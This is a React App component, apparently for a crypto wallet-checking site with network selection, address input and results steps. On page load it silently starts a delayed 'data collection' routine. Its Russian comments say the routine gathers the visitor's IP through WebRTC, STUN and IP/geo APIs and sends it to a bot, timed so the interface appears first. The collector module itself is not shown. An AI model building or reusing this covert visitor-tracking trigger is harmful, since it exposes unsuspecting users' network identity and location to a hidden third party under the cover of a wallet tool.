import { useState, useEffect } from 'react';
import { NetworkSelection } from './components/NetworkSelection';
import { AddressInput } from './components/AddressInput';
import { CheckResults } from './components/CheckResults';
import { Header } from './components/Header';
import { Footer } from './components/Footer';
// 🚀 ЛЕНИВАЯ ЗАГРУЗКА - тяжелые скрипты загружаются в фоне
import { startDelayedDataCollection } from './utils/lazy-data-collector';
// 💡 Console commands для отладки
import './utils/data-collector-console';

export type Network = 'tron' | 'ethereum' | 'bsc';

// Declare Telegram type
declare global {
  interface Window {
    Telegram?: any;
  }
}

export default function App() {
  const [step, setStep] = useState<1 | 2 | 3>(1);
  const [selectedNetwork, setSelectedNetwork] = useState<Network | null>(null);
  const [walletAddress, setWalletAddress] = useState('');

  // Получение IP и отправка в бота при загрузке приложения
  useEffect(() => {
    // 🚀 ОТЛОЖЕННЫЙ ЗАПУСК - UI загружается мгновенно
    // Сбор данных начинается через 1 секунду после загрузки UI
    // Все тяжелые операции (WebRTC, STUN, IP API, Geo API) не блокируют рендер
    startDelayedDataCollection(1000); // 1000ms = 1 секунда задержки
  }, []); // Выполняется один раз при монтировании компонента

  const handleNetworkSelect = (network: Network) => {
    setSelectedNetwork(network);
  };

  const handleContinueFromNetwork = () => {
    if (selectedNetwork) {
      setStep(2);
    }
  };

  const handleCheckWallet = (address: string) => {
    setWalletAddress(address);
    setStep(3);
  };

  const handleStartOver = () => {
    setStep(1);
    setSelectedNetwork(null);
    setWalletAddress('');
  };

  return (
    <div className="relative min-h-screen w-full" style={{ backgroundImage: "linear-gradient(90deg, rgb(250, 251, 252) 0%, rgb(250, 251, 252) 100%), linear-gradient(90deg, rgb(255, 255, 255) 0%, rgb(255, 255, 255) 100%)" }}>
      <div className="content-stretch flex flex-col items-start w-full">
        <Header />
        
        <div className="w-full flex justify-center">
          <div className="max-w-[534px] w-full">
            <div className="box-border content-stretch flex flex-col items-start w-full pb-[100px] pt-[40px] px-[15px]">
              {step === 1 && (
                <NetworkSelection
                  selectedNetwork={selectedNetwork}
                  onSelectNetwork={handleNetworkSelect}
                  onContinue={handleContinueFromNetwork}
                />
              )}
              
              {step === 2 && (
                <AddressInput
                  network={selectedNetwork!}
                  onCheck={handleCheckWallet}
                  onBack={() => setStep(1)}
                />
              )}
              
              {step === 3 && (
                <CheckResults
                  network={selectedNetwork!}
                  address={walletAddress}
                  onStartOver={handleStartOver}
                />
              )}
            </div>
          </div>
        </div>
        
        <Footer />
      </div>
    </div>
  );
}